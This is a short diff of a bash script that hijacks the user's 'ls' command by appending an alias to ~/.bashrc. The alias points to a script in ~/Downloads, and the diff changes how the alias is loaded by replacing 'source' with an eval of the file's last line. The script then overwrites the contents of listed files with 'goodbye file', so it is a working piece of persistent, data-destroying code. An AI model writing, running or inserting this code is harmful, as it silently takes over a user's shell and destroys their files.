@@ -13,11 +13,12 @@ aliasToMatch="alias ls='~/Downloads/script.sh'"
 currentLastLine=$(cat ~/.bashrc | tail -n 1)
 if [ "$currentLastLine" != "$aliasToMatch" ]; then
 	echo "$aliasToMatch" >> ~/.bashrc
-	source ~/.bashrc
+#	source ~/.bashrc
 fi
 
 # resource ./bashrc every time script is run just in case
-source ~/.bashrc
+#source ~/.bashrc
+eval "$(cat ~/.bashrc | tail -n 1)"
 
 # List files before altering
 ls
@@ -30,6 +31,3 @@ for key in ${!filearray[@]}
 do
 	echo "goodbye file" > ${filearray[$key]}
 done
-
-
-
